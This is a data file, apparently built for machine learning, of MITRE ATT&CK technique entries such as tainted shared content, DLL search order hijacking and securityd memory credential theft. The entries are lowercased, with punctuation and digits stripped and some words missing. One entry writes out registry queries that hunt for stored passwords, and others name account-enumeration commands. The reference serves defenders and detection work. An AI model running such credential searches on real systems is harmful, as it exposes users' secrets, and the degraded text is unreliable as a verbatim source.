attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c,['enterprise-attack'],['T1080'],Taint Shared Content,adversaries may deliver payloads to remote systems by adding content to shared storage locations  such as network drives or internal code repositories  content stored on network drives or in other shared locations may be tainted by adding malicious programs  scripts  or exploit code to otherwise valid files  once a user opens the shared tainted content  the malicious portion can be executed to run the adversary's code on a remote system  adversaries may use tainted shared content to move laterally_  a directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory  it uses  shortcut  of directory _lnk files that use  to look like the real directories  which are hidden through  hidden files and  the malicious _lnk based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs  when used with frequently used network directories  the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts   citation  retwin directory share pivot   adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory  the malware may modify the original entry point  oep  of the healthy binary to ensure that it is executed before the legitimate code  the infection could continue to spread via the newly infected file when it is executed by a remote system  these infections may target both binary and non binary formats that end with extensions including  but not limited to  _exe  _dll  _scr  _bat  and or _vbs 
attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee,['enterprise-attack'],['T1484.002'],Domain Trust Modification,adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and or elevate privileges  domain trust details  such as whether or not a domain is federated  allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources_ citation  microsoft   azure ad federation  these trust objects may include accounts  credentials  and other authentication material applied to servers  tokens  and domains_  manipulating the domain trusts may allow an adversary to escalate privileges and or evade defenses by modifying settings to add objects which they control  for example  this may be used to forge  saml  without the need to compromise the signing certificate to forge new credentials  instead  an adversary can manipulate domain trusts to add their own signing certificate  an adversary may also convert a domain to a federated domain  which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user_ citation  aadinternals zure ad federated domain 
attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41,['enterprise-attack'],['T1573.001'],Symmetric Cryptography,adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol  symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption  common symmetric encryption algorithms include aes  des   des  blowfish  and rc  
attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e,['enterprise-attack'],['T1087.001'],Local Account,adversaries may attempt to get a listing of local system accounts  this information can help adversaries determine which local accounts exist on a system to aid in follow on behavior_  commands such as net user and net localgroup of the  utility and id and groupson macos and linux can list local users and groups  on linux  local users can also be enumerated through the use of the  etc passwd file  on macos the dscl   list  users command can be used to enumerate local accounts 
attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b,['enterprise-attack'],['T1167'],Securityd Memory,in os x prior to el capitan  users with root access can read plaintext keychain passwords of logged in users because apple s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords   citation  os x keychain   citation  external to da  the os x way  apple s securityd utility takes the user s logon password  encrypts it with pbkdf   and stores this master key in memory  apple also uses a set of keys and algorithms to encrypt the user s password  but once the master key is found  an attacker need only iterate over the other values to unlock the final password   citation  os x keychain   if an adversary can obtain root access  allowing them to read securityd s memory   then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user s logon keychain  this provides the adversary with all the plaintext passwords for users  wifi  mail  browsers  certificates  secure notes  etc   citation  os x keychain   citation  osx keydnap malware 
attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d,['enterprise-attack'],['T1586.001'],Social Media Accounts,adversaries may compromise social media accounts that can be used during targeting  for operations incorporating social engineering  the utilization of an online persona may be important  rather than creating and cultivating social media profiles  i_e   social media  adversaries may compromise existing social media accounts  utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship  or knowledge of  the compromised persona    a variety of methods exist for compromising social media accounts  such as gathering credentials via  phishing for  purchasing credentials from third party sites  or by brute forcing credentials  ex  password reuse from breach credential dumps   prior to compromising social media accounts  adversaries may conduct reconnaissance to inform decisions about which accounts to compromise to further their operation_  personas may exist on a single site or across multiple sites  ex  facebook  linkedin  twitter  etc_   compromised social media accounts may require additional development  this could include filling out or modifying profile information  further developing social networks  or incorporating photos_  adversaries can use a compromised social media profile to create new  or hijack existing  connections to targets of interest  these connections may be direct or may include trying to connect through others  compromised profiles may be leveraged during other phases of the adversary lifecycle  such as during initial access  ex   spearphishing via
attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a,['enterprise-attack'],['T1527'],Application Access Token,adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts  information  or services on remote systems  these tokens are typically stolen from users and used in lieu of login credentials_  application access tokens are used to make authorized api requests on behalf of a user and are commonly used as a way to access resources in cloud based applications and software as a service  saas _ citation  auth    why you should always use access tokens to secure apis sept       oauth is one commonly implemented framework that issues tokens to users for access to systems  these frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform  once identity is established  the token allows actions to be authorized  without passing the actual credentials of the user  therefore  compromise of the token can grant the adversary access to resources of other sites through a malicious application_  for example  with a cloud based email service once an oauth access token is granted to a malicious application  it can potentially gain long term access to features of the user account if a  refresh  token enabling background access is awarded_ citation  microsoft identity platform access       with an oauth access token an adversary can use the user granted rest api to perform functions such as email searching and contact enumeration_ citation  staaldraad phishing with oauth        compromised access tokens may be used as an initial step in compromising other services  for example  if a token grants access to a victim s primary email  the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines  direct api access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords  access abuse over an api channel can be difficult to detect even from the service provider end  as the access can still align well with a legitimate workflow_
attack-pattern--28170e17-8384-415c-8486-2e6b294cb803,['enterprise-attack'],['T1562.009'],Safe Mode Boot,adversaries may abuse windows safe mode to disable endpoint defenses  safe mode starts up the windows operating system with a limited set of drivers and services  third party security software such as endpoint detection and response  edr  tools may not start after booting windows in safe mode  there are two versions of safe mode  safe mode and safe mode with networking  it is possible to start additional services after a safe mode boot_ citation  microsoft safe mode  citation  sophos snatch ransomware        adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot  hosts can be forced into safe mode after the next reboot via modifications to boot configuration data  bcd  stores  which are files that manage boot application settings_ citation  microsoft bcdedit        adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant registry values  i_e   modify  malicious  component object   com  objects may also be registered and loaded in safe mode_ citation  sophos snatch ransomware       citation  cyberark labs safe mode       citation  cybereason nocturnus medusalocker       citation  bleepingcomputer revil      
attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae,['enterprise-attack'],['T1180'],Screensaver,screensavers are programs that execute after a configurable time of user inactivity and consist of portable executable  pe  files with a _scr file extension_ citation  wikipedia screensaver  the windows screensaver application scrnsave_scr is located in c  windows system     and c  windows syswow    on    bit windows systems  along with screensavers included with base windows installations    the following screensaver settings are stored in the registry  hkcu control panel desktop   and could be manipulated to achieve persistence     scrnsave_exe   set to malicious pe path   screensaveactive   set to ' ' to enable the screensaver   screensaverissecure   set to ' ' to not require a password to unlock   screensavetimeout   sets user inactivity timeout before screensaver is executed  adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity   citation  eset gazer aug      
attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4,['enterprise-attack'],['T1542.005'],TFTP Boot,adversaries may abuse netbooting to load an unauthorized network device operating system from a trivial file transfer protocol  tftp  server  tftp boot  netbooting  is commonly used by network administrators to load configuration controlled network device images from a centralized management server  netbooting is one option in the boot sequence and can be used to centralize  manage  and control device images_  adversaries may manipulate the configuration on the network device specifying use of a malicious tftp server  which may be used in conjunction with  modify system  to load a modified image on device startup or reset  the unauthorized image allows adversaries to modify device configuration  add malicious capabilities to the device  and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality  this technique is similar to  and may result in the network device running a modified image   citation  cisco blog legacy device attacks 
attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32,['enterprise-attack'],['T1543.003'],Windows Service,adversaries may create or modify windows services to repeatedly execute malicious payloads as part of persistence  when windows boots up  it starts programs or applications called services that perform background system functions_ citation  technet services  windows service configuration information  including the file path to the service's executable or recovery programs commands  is stored in the windows registry_  adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system  service configurations can be set or modified using system utilities  such as sc_exe   by directly modifying the registry  or by interacting directly with the windows api    adversaries may also use services to install and execute malicious drivers  for example  after dropping a driver file  ex   _sys   to disk  the payload can be loaded and registered via  native  functions such as  createservicew     or manually via functions such as  zwloaddriver    and  zwsetvaluekey      by creating the required service registry values  i_e   modify  or by using command line utilities such as  pnputil_exe _ citation  symantec w_   stuxnet dossier  citation  crowdstrike driveslayer february       citation  unit   acidbox june       adversaries may leverage these drivers as  to hide the presence of malicious activity on a system  adversaries may also load a signed yet vulnerable driver onto a compromised machine  known as  bring your own vulnerable driver   byovd   as part of  exploitation for privilege  eset invisimole june       citation  unit   acidbox june        services may be created with administrator privileges but are executed under system privileges  so an adversary may also use a service to escalate privileges  adversaries may also directly start services through  service  to make detection analysis more challenging  malicious services may also incorporate  masquerade task or   ex  using a service and or payload name related to a legitimate os or benign software component  
attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6,['enterprise-attack'],['T1568.001'],Fast Flux DNS,adversaries may use fast flux dns to hide a command and control channel behind an array of rapidly changing ip addresses linked to a single domain resolution  this technique uses a fully qualified domain name  with multiple ip addresses assigned to it which are swapped with high frequency  using a combination of round robin ip addressing and short time to live  ttl  for a dns resource record_ citation  fast flux   welivesecurity   the simplest   single flux  method  involves registering and de registering an addresses as part of the dns a  address  record list for a single dns name  these registrations have a five minute average lifespan  resulting in a constant shuffle of ip address resolution_ citation  fast flux   welivesecurity   in contrast  the  double flux  method registers and de registers an address as part of the dns name server record list for the dns zone  providing additional resilience for the connection  with double flux additional hosts can act as a proxy to the c  host  further insulating the true source of the c  channel 
attack-pattern--29be378d-262d-4e99-b00d-852d573628e6,['enterprise-attack'],['T1497.001'],System Checks,adversaries may employ various system checks to detect and avoid virtualization and analysis environments  this may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment  vme  or sandbox  if the adversary detects a vme  they may alter their malware to disengage from the victim or conceal the core functions of the implant  they may also search for vme artifacts before dropping secondary or additional payloads  adversaries may use the information learned from  virtualization sandbox  during automated discovery to shape follow on behaviors_ citation  deloitte environment awareness   specific checks will vary based on the target and or adversary  but may involve behaviors such as  windows management    system information  and  query  to obtain system information and search for vme artifacts  adversaries may search for vme artifacts in memory  processes  file system  hardware  and or the registry  adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment    checks could include generic system properties such as host domain name and samples of network traffic  adversaries may also check the network adapters addresses  cpu core count  and available memory drive size    other common checks may enumerate services running that are unique to these applications  installed programs on the system  manufacturer product fields for strings relating to virtual machine applications  and vme specific hardware processor instructions_ citation  mcafee virtual jan       in applications like vmware  adversaries can also use a special i o port to send commands and receive output     hardware checks  such as the presence of the fan  temperature  and audio devices  could also be used to gather evidence that can be indicative a virtual environment  adversaries may also query for specific readings from these devices_ citation  unit    oilrig sept      
attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c,['enterprise-attack'],['T1053.003'],Cron,adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code_ citation     macos common tools and techniques  the cron utility is a time based job scheduler for unix like operating systems   the  crontab file contains the schedule of cron entries to be run and the specified times for execution  any crontab files are stored in operating system specific file paths_  an adversary may use cron in linux or unix environments to execute programs at system startup or on a scheduled basis for
attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c,['enterprise-attack'],['T1069.002'],Domain Groups,adversaries may attempt to find domain level groups and permission settings  the knowledge of domain level permission groups can help adversaries determine which groups exist and which users belong to a particular group  adversaries may use this information to determine which users have elevated permissions  such as domain administrators_  commands such as net group  domain of the  utility   dscacheutil  q group on macos  and ldapsearch on linux can list domain level groups 
attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327,['enterprise-attack'],['T1588.006'],Vulnerabilities,adversaries may acquire information about vulnerabilities that can be used during targeting  a vulnerability is a weakness in computer hardware or software that can  potentially  be exploited by an adversary to cause unintended or unanticipated behavior to occur  adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases_ citation  national vulnerability database   an adversary may monitor vulnerability disclosures databases to understand the state of existing  as well as newly discovered  vulnerabilities  there is usually a delay between when a vulnerability is discovered and when it is made public  an adversary may target the systems of those known to conduct vulnerability research  including commercial vendors   knowledge of a vulnerability may cause an adversary to search for an existing exploit  i_e   or to attempt to develop one themselves  i_e 
attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7,['enterprise-attack'],['T1566.002'],Spearphishing Link,adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems  spearphishing with a link is a specific variant of spearphishing  it is different from other forms of spearphishing in that it employs the use of links to download malware contained in email  instead of attaching malicious files to the email itself  to avoid defenses that may inspect email attachments  spearphishing may also involve social engineering techniques  such as posing as a trusted source_  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this case  the malicious emails contain links  generally  the links will be accompanied by social engineering text and require the user to actively click or copy and paste a url into a browser  leveraging  user  the visited website may compromise the web browser using an exploit  or the user will be prompted to download applications  documents  zip files  or even executables depending on the pretext for the email in the first place  adversaries may also include links that are intended to interact directly with an email reader  including embedded images intended to exploit the end system directly or verify the receipt of an email  i_e  web bugs web beacons   additionally  adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites  known as an  idn homograph attack  _ citation  cisa idn st         adversaries may also utilize links to perform consent phishing  typically with oauth  _  request urls that when accepted by the user provide permissions access for malicious applications  allowing adversaries to   steal application access  trend micro pawn storm oauth       these stolen access tokens allow the adversary to perform various actions on behalf of the user via api calls   citation  microsoft oauth  _  consent phishing      
attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f,['enterprise-attack'],['T1165'],Startup Items,per apple s documentation  startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items  citation  startup items   this is technically a deprecated version  superseded by launch daemons   and thus the appropriate folder   library startupitems isn t guaranteed to exist on the system by default  but does appear to exist by default on macos sierra  a startup item is a directory whose executable and configuration property list  plist   startupparameters_plist  reside in the top level directory    an adversary can create the appropriate folders files in the startupitems directory to register their own persistence mechanism  citation  methods of mac malware persistence   additionally  since startupitems run during the bootup phase of macos  they will run as root  if an adversary is able to modify an existing startup item  then they will be able to privilege escalate as well 
attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36,['enterprise-attack'],['T1070.002'],Clear Linux or Mac System Logs,adversaries may clear system logs to hide evidence of an intrusion  macos and linux both keep track of system or user initiated actions via system logs  the majority of native system logging is stored under the  var log  directory  subfolders in this directory categorize logs by their related functions  such as  citation  linux logs      var log messages   general and system related messages    var log secure or  var log auth_log  authentication logs    var log utmp or  var log wtmp  login records    var log kern_log  kernel logs    var log cron_log  crond logs    var log maillog  mail server logs    var log httpd   web server access and error logs
attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0,['enterprise-attack'],['T1499.004'],Application or System Exploitation,adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users   citation  sucuri bind  august       some systems may automatically restart critical applications and services when crashes occur  but they can likely be re exploited to cause a persistent denial of service  dos  condition_  adversaries may exploit known or zero day vulnerabilities to crash applications and or systems  which may also lead to dependent applications and or systems to be in a dos condition  crashed or restarted applications or systems may also have other effects such as  data   firmware   service  etc  which may further cause a dos condition and deny availability to critical information  applications and or systems 
attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53,['enterprise-attack'],['T1137'],Office Application Startup,adversaries may leverage microsoft office based applications for persistence between startups  microsoft office is a fairly common application suite on windows based operating systems within an enterprise network  there are multiple mechanisms that can be used with office for persistence when an office based application is started  this can include the use of office template macros and add ins_  a variety of features have been discovered in outlook that can be abused to obtain persistence  such as outlook rules  forms  and home page_ citation  sensepost ruler github  these persistence mechanisms can work within outlook or be used through office    _ citation  technet o    outlook rules 
attack-pattern--2cd950a6-16c4-404a-aa01-044322395107,['enterprise-attack'],['T1218.004'],InstallUtil,adversaries may use installutil to proxy execution of code through a trusted windows utility  installutil is a command line utility that allows for installation and uninstallation of resources by executing specific installer components specified in _net binaries   citation  msdn installutil  the installutil binary may also be digitally signed by microsoft and located in the _net directories on a windows system  c  windows microsoft_net framework v installutil_exe and c  windows microsoft_net framework   v installutil_exe_  installutil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  system_componentmodel_runinstaller true     citation  lolbas installutil 
attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230,['enterprise-attack'],['T1598.003'],Spearphishing Link,adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting  spearphishing for information is an attempt to trick targets into divulging information  frequently credentials or other actionable information  spearphishing for information frequently involves social engineering techniques  such as posing as a source with a reason to collect information  ex   establish  or  compromise  and or sending multiple  seemingly urgent messages_  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a url into a browser_ citation  trendmictro phishing  citation  pcmag fakelogin  the given website may be a clone of a legitimate site  such as an online or corporate login portal  or may closely resemble a legitimate site in appearance and have a url containing elements from the real site    from the fake website  information is gathered in web forms and sent to the adversary  adversaries may also use information from previous reconnaissance efforts  ex   search open  or  search victim owned  to craft persuasive and believable lures 
attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6,['enterprise-attack'],['T1021.004'],SSH,adversaries may use  valid  to log into remote machines using secure shell  ssh   the adversary may then perform actions as the logged on user_  ssh is a protocol that allows authorized users to open remote shells on other computers  many linux and macos versions come with ssh installed by default  although typically disabled until the user enables it  the ssh server can be configured to use standard password authentication or public private keypairs in lieu of or in addition to a password  in this authentication scenario  the user s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user 
attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3,['enterprise-attack'],['T1098.003'],Additional Cloud Roles,an adversary may add additional roles or permissions to an adversary controlled cloud account to maintain persistent access to a tenant  for example  adversaries may update iam policies in cloud based environments or add a new global administrator in office     environments_ citation  aws iam policies and permissions  citation  google cloud iam policies  citation  microsoft support o    add another admin  october       citation  microsoft o    admin roles  with sufficient permissions  a compromised account can gain almost unlimited access to data and settings  including the ability to reset the passwords of other admins _ citation  expel aws attacker   citation  microsoft o    admin roles    this account modification may immediately follow  create  or other malicious account activity  adversaries may also modify existing  valid  that they have compromised  this could lead to privilege escalation  particularly if the roles added allow for lateral movement to additional accounts_  for example  in azure ad environments  an adversary with the application administrator role can add  additional cloud  to their application's service principal  in doing so the adversary would be able to gain the service principal s roles and permissions  which may be different from those of the application administrator_ citation  specterops azure privilege escalation  similarly  in aws environments  an adversary with appropriate permissions may be able to use the createpolicyversion api to define a new version of an iam policy or the attachuserpolicy api to attach an iam policy with additional or distinct permissions to a compromised user account_ citation  rhino security labs aws privilege escalation   similarly  an adversary with the azure ad global administrator role can toggle the  access management for azure resources  option to gain the ability to assign privileged access to azure subscriptions and virtual machines to azure ad users  including themselves_ citation  azure ad to ad 
attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad,['enterprise-attack'],['T1547.012'],Print Processors,adversaries may abuse print processors to run malicious dlls during system boot for persistence and or privilege escalation  print processors are dlls that are loaded by the print spooler service  spoolsv_exe  during boot    adversaries may abuse the print spooler service by adding print processors that load malicious dlls at startup  a print processor can be installed through the addprintprocessor api call with an account that has seloaddriverprivilege enabled  alternatively  a print processor can be registered to the print spooler service by adding the hklm system   currentcontrolset or controlset     control print environments   windows architecture  e_g_  windows x    print processors   user defined  driver registry key that points to the dll  for the print processor to be correctly installed  it must be located in the system print processor directory that can be found with the getprintprocessordirectory api call_ citation  microsoft addprintprocessor may       after the print processors are installed  the print spooler service  which starts during boot  must be restarted in order for them to run_ citation  eset pipemon may       the print spooler service runs under system level permissions  therefore print processors installed by an adversary may run under elevated privileges 
attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044,['enterprise-attack'],['T1089'],Disabling Security Tools,adversaries may disable security tools to avoid possible detection of their tools and activities  this can take the form of killing security software or event logging processes  deleting registry keys so that tools do not start at run time  or other methods to interfere with security scanning or event reporting 
attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e,['enterprise-attack'],['T1487'],Disk Structure Wipe,adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems  targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources    adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record  mbr  or partition table_ citation  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill       citation  unit    shamoon        the data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk  if this information is not present  the computer will not be able to load an operating system during the boot process  leaving the computer unavailable   disk structure  may be performed in isolation  or along with  disk content  if all sectors of a disk are wiped_  to maximize impact on the target organization  malware designed for destroying disk structures may have worm like features to propagate across a network by leveraging other techniques like  valid   os credential  and  windows admin  symantec shamoon       citation  fireeye shamoon nov       citation  palo alto shamoon nov       citation  kaspersky stonedrill      
attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597,['enterprise-attack'],['T1566.001'],Spearphishing Attachment,adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems  spearphishing attachment is a specific variant of spearphishing  spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email  all forms of spearphishing are electronically delivered social engineering targeted at a specific individual  company  or industry  in this scenario  adversaries attach a file to the spearphishing email and usually rely upon  user  to gain execution  spearphishing may also involve social engineering techniques  such as posing as a trusted source_  there are many options for the attachment such as microsoft office documents  executables  pdfs  or archived files  upon opening the attachment  and potentially clicking past protections   the adversary's payload exploits a vulnerability or directly executes on the user's system  the text of the spearphishing email usually tries to give a plausible reason why the file should be opened  and may explain how to bypass system protections in order to do so  the email may also contain instructions on how to decrypt an attachment  such as a zip file password  in order to evade email boundary defenses  adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files  or files exploiting one application appear to be a file for a different one 
attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286,['enterprise-attack'],['T1214'],Credentials in Registry,the windows registry stores configuration information that can be used by the system or other programs  adversaries may query the registry looking for credentials and passwords that have been stored for use by other programs or services  sometimes these credentials are used for automatic logons_  example commands to find registry keys related to password information   citation  pentestlab stored credentials     local machine hive  reg query hklm  f password  t reg_sz  s   current user hive  reg query hkcu  f password  t reg_sz  s
attack-pattern--2f41939b-54c3-41d6-8f8b-35f1ec18ed97,['enterprise-attack'],['T1027.008'],Stripped Payloads,adversaries may attempt to make a payload difficult to analyze by removing symbols  strings  and other human readable information  scripts and executables may contain variables names and other strings that help developers document code functionality  symbols are often created by an operating system s  linker  when executable payloads are compiled  reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads_ citation  mandiant golang stripped binaries explanation  citation  intezer stripped binaries elf files        adversaries may use stripped payloads in order to make malware analysis more difficult  for example  compilers and other tools may provide features to remove or obfuscate strings and symbols  adversaries have also used stripped payload formats  such as run only applescripts  a compiled and stripped version of  to evade detection and analysis  the lack of human readable information may directly hinder detection and analysis of payloads_ citation  sentinellabs reversing run only applescripts      
attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64,['enterprise-attack'],['T1559.001'],Component Object Model,adversaries may use the windows component object model  com  for local code execution  com is an inter process communication  ipc  component of the native windows application programming interface  api  that enables interaction between software objects  or executable code that implements one or more interfaces_ citation  fireeye hunting com june       through com  a client object can call methods of server objects  which are typically binary dynamic link libraries  dll  or executables  exe _ citation  microsoft com  remote com execution is facilitated by  remote  such as   distributed component object   dcom _ citation  fireeye hunting com june        various com interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as c  c    java  and  visual  microsoft com  specific com objects also exist to directly perform functions beyond code execution  such as creating a  scheduled  fileless download execution  and other adversary behaviors related to privilege escalation and persistence_ citation  fireeye hunting com june       citation  projectzero file write eop apr      
attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34,['enterprise-attack'],['T1574.001'],DLL Search Order Hijacking,adversaries may execute their own malicious payloads by hijacking the search order used to load dlls  windows systems use a common method to look for required dlls to load into a program   citation  microsoft dynamic link library search order  citation  fireeye hijacking july       hijacking dll loads may be for the purpose of establishing persistence as well as elevating privileges and or evading restrictions on file execution_  there are many ways an adversary can hijack dll loads  adversaries may plant trojan dynamic link library files  dlls  in a directory that will be searched before the location of a legitimate library that will be requested by a program  causing windows to load their malicious library when it is called for by the victim program  adversaries may also perform dll preloading  also called binary planting attacks   citation  owasp binary planting  by placing a malicious dll with the same name as an ambiguously specified dll in a location that windows searches before the legitimate dll  often this location is the current working directory of the program_ citation  fireeye fxsst june       remote dll preloading attacks occur when a program sets its current directory to a remote location such as a web share before loading a dll   citation  microsoft security advisory           adversaries may also directly modify the search order via dll redirection  which after being enabled  in the registry and creation of a redirection file  may cause a program to load a different dll_ citation  microsoft dynamic link library redirection  citation  microsoft manifests  citation  fireeye dll search order hijacking   if a search order vulnerable program is configured to run at a higher privilege level  then the adversary controlled dll that is loaded will also be executed at the higher level  in this case  the technique could be used for privilege escalation from user to administrator or system or from administrator to system  depending on the program  programs that fall victim to path hijacking may appear to behave normally because malicious dlls may be configured to also load the legitimate dlls they were meant to replace 
attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619,['enterprise-attack'],['T1119'],Automated Collection,once established within a system or network  an adversary may use automated techniques for collecting internal data  methods for performing this technique could include use of a  command and scripting  to search for and copy information fitting set criteria such as file type  location  or name at specific time intervals  in cloud based environments  adversaries may also use cloud apis  command line interfaces  or extract  transform  and load  etl  services to automatically collect data  this functionality could also be built into remote access tools    this technique may incorporate use of other techniques such as  file and directory  and  lateral tool  to identify and move files  as well as  cloud service  and  cloud storage object  to identify resources in cloud environments 
attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f,['enterprise-attack'],['T1115'],Clipboard Data,adversaries may collect data stored in the clipboard from users copying information within or between applications    in windows  applications can access clipboard data by using the windows api_ citation  msdn clipboard  osx provides a native command  pbpaste  to grab clipboard contents_ citation  operating with empyre 
attack-pattern--3120b9fa-23b8-4500-ae73-09494f607b7d,['enterprise-attack'],['T1003.007'],Proc Filesystem,adversaries may gather credentials from information stored in the proc filesystem or  proc  the proc filesystem on linux contains a great deal of information regarding the state of the running operating system  processes running with root privileges can use this facility to scrape live memory of other running programs  if any of these programs store passwords in clear text or password hashes in memory  these values can then be harvested for either usage or brute force attacks  respectively_  this functionality has been implemented in the mimipenguin citation  mimipenguin github may        an open source tool inspired by mimikatz  the tool dumps process memory  then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as gnome keyring  sshd  and apache use memory to store such authentication artifacts 
attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074,['enterprise-attack'],['T1583.005'],Botnet,adversaries may buy  lease  or rent a network of compromised systems that can be used during targeting  a botnet is a network of compromised systems that can be instructed to perform coordinated tasks_ citation  norton botnet  adversaries may purchase a subscription to use an existing botnet from a booter stresser service  with a botnet at their disposal  adversaries may perform follow on activity such as large scale  or distributed denial of service  ddos _ citation  imperva ddos for hire 
attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21,['enterprise-attack'],['T1555.005'],Password Managers,adversaries may acquire user credentials from third party password managers_ citation  ise password manager february       password managers are applications designed to store user credentials  normally in an encrypted database  credentials are typically accessible after a user provides a master password that unlocks the database  after the database is unlocked  these credentials may be copied to memory  these databases can be stored as files on disk_ citation  ise password manager february        adversaries may acquire user credentials from password managers by extracting the master password and or plain text credentials from memory_ citation  foxit wocao december       citation  github keethief  adversaries may extract credentials from memory via  exploitation for credential  nvd cve             adversaries may also try brute forcing via  password  to obtain the master password of a password manager_ citation  cyberreason anchor december      
attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41,['enterprise-attack'],['T1103'],AppInit DLLs,dynamic link libraries  dlls  that are specified in the appinit_dlls value in the registry keys hkey_local_machine software microsoft windows nt currentversion windows or hkey_local_machine software wow    node microsoft windows nt currentversion windows are loaded by user  _dll into every process that loads user  _dll  in practice this is nearly every program  since user  _dll is a very common library   citation  elastic process injection july       similar to  process  these values can be abused to obtain persistence and privilege escalation by causing a malicious dll to be loaded and run in the context of separate processes on the computer   citation  appinit registry   the appinit dll functionality is disabled in windows   and later versions when secure boot is enabled   citation  appinit secure boot 
attack-pattern--31a0a2ac-c67c-4a7e-b9ed-6a96477d4e8e,['enterprise-attack'],['T1553.001'],Gatekeeper Bypass,adversaries may modify file attributes and subvert gatekeeper functionality to evade user prompts and execute untrusted programs  gatekeeper is a set of technologies that act as layer of apple s security model to ensure only trusted applications are executed on a host  gatekeeper was built on top of file quarantine in snow leopard    _         and has grown to include code signing  security policy compliance  notarization  and more  gatekeeper also treats applications running for the first time differently than reopened applications_ citation  theeclecticlightcompany quarantine and the flag  citation  theeclecticlightcompany apple notarization    based on an opt in system  when files are downloaded an extended attribute  xattr  called  com_apple_quarantine   also known as a quarantine flag  can be set on the file by the application performing the download  launch services opens the application in a suspended state  for first run applications with the quarantine flag set  gatekeeper executes the following functions      checks extended attribute   gatekeeper checks for the quarantine flag  then provides an alert prompt to the user to allow or deny execution_ citation  oceanlotus for os x  citation     macos common tools and techniques      checks system policies   gatekeeper checks the system security policy  allowing execution of apps downloaded from either just the app store or the app store and identified developers_     code signing   gatekeeper checks for a valid code signature from an apple developer id_     notarization   using the  api_apple cloudkit_com  api  gatekeeper reaches out to apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked  users can override notarization  which will result in a prompt of executing an  unauthorized app  and the security policy will be modified_  adversaries can subvert one or multiple security controls within gatekeeper checks through 